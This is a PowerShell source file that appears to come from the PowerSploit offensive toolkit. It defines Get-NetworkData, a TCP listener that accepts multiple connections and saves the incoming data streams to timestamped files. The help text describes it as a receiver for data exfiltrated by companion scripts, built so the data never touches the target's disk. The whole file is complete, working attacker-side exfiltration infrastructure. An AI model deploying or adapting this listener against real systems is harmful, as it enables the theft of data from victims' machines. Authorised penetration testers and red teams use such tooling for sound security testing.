function Get-NetworkData {
<#
.SYNOPSIS
    Receiver for data sent over the network by enabled scripts.
    PowerSploit Function: Get-NetworkData.ps1
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION
    This function creates a network listener which can be used to receive files from other
    scripts which have been designed to work with it.  This allows for exfiltration of data
    without having that data touchthe disk of the target system.  
    
.PARAMETER Port
    Network port to lisen on. This port must be available.    
.PARAMETER Path
    Directory to store received files in.
.EXAMPLE
    Get-NetworkData -Path c:\temp -Port 5555
#>
    Param (
        [Parameter(Mandatory=$true)]
        [int32]$Port,

        [Parameter(Mandatory=$True)]
        $Path
    )
    # Script to receive data from the network
    $CallBack = {
        Param 
        (
            $Result,
            $Path
        )
        
        # Get the network data stream
        $Client = $Result.Result
        $RemoteEndPoint = $Client.Client.RemoteEndPoint.Address.ToString()
        $NetworkStream = $Client.GetStream()

        # Prepare the file
        $Now = [DateTime]::Now
        $FileName = Join-Path $Path "$RemoteEndPoint`_$($Now.Year)$($Now.Month)$($Now.Day)$($Now.Hour)$($Now.Minute)$($Now.Second)"
        $File = [System.IO.File]::Open($FileName, [System.IO.FileMode]::CreateNew, [System.IO.FileAccess]::Write)
        
        $ReceiveBuffer = New-Object byte[] 4096
        $Timeout = 0
        while($Client.Connected -or $NetworkStream.DataAvailable) 
        {
            if($NetworkStream.DataAvailable)
            {
                $BytesRead = $NetworkStream.Read($ReceiveBuffer, 0, $ReceiveBuffer.Length)
                $File.Write($ReceiveBuffer, 0, $BytesRead)
                $ReceiveBuffer.Clear()
            }
            else 
            {
                Start-Sleep -Milliseconds 5
                $NetworkStream.WriteByte(0x00)
            }
        }
        $File.Close()
        $NetworkStream.Close()
        $Client.Close()
    }

    # Main
    $TcpListener = New-Object System.Net.Sockets.TcpListener([ipaddress]::Any , $Port)
    $TcpListener.Start()
    Write-Host "Listening on port $Port Press <ESC> to exit."
    
    $Loop = $true
    $Connections = @()
    try 
    {
        while ($Loop) 
        {
            # Track and report on connections
            foreach ($Conn in $Connections | Where{ $_.HasReported -eq $false }) 
            {
                if($Conn.AsyncObject.IsCompleted -eq $true)
                {
                    Write-Host "$($Conn.RemoteEndPoint) complete"
                    $Data = $Conn.PowerShell.EndInvoke($Conn.AsyncObject)
                    write-output $Data
                    $Conn.PowerShell.Dispose()
                    $Conn.HasReported = $true
                }
            }               

            # Accept connections and delegate to individual runspaces                            
            if($TcpListener.Pending()) 
            {
                $Result = $TcpListener.AcceptTcpClientAsync()
                $RemoteEndPoint = $Result.Result.Client.RemoteEndPoint
                Write-Host "Connection received from $RemoteEndPoint"
                
                # Create Runspace
                $Runspace = [RunspaceFactory]::CreateRunspace()
                $PowerShell = [PowerShell]::Create()
                $PowerShell.Runspace = $Runspace
                $Runspace.Open()
                $Params = 
                @{
                    Result = $Result
                    Path = $Path
                }
                [void]$PowerShell.AddScript($CallBack).AddParameters($Params)
                $AsyncObject = $PowerShell.BeginInvoke()

                # Runspace tracking object
                $Connections += New-Object PSobject -Property `
                    @{
                        RemoteEndPoint = $RemoteEndPoint
                        PowerShell = $PowerShell
                        AsyncObject = $AsyncObject
                        HasReported = $false
                    }
            }
            else 
            {
                # Exit on <ESC>
                Start-Sleep -Seconds 1
                if($Host.UI.RawUI.KeyAvailable)
                {
                    $Key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp")
                    if($Key.VirtualKeyCode -eq 27) 
                    {
                        $Loop = $false
                    }
                }
            }
        }
    }
    catch
    {
        throw $_
    }
    finally 
    {
        $TcpListener.Stop()
    }
}
